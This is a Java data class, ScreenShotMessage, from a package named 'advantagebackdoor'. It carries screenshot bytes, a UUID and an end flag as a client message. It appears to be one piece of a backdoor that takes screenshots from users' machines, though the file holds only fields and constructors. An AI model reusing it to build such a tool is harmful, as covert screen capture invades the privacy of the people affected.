package me.faintcloudy.advantagebackdoor.api.message.play.client;

import com.alibaba.fastjson.annotation.JSONField;

import java.util.UUID;

public class ScreenShotMessage extends ClientNetworkMessage {
    @JSONField
    public byte[] image;
    @JSONField
    public UUID uuid;
    @JSONField
    public boolean end;

    public ScreenShotMessage(byte[] image, UUID uuid, boolean end)
    {
        this.image = image;
        this.uuid = uuid;
        this.end = end;
    }

    public ScreenShotMessage() {}

}
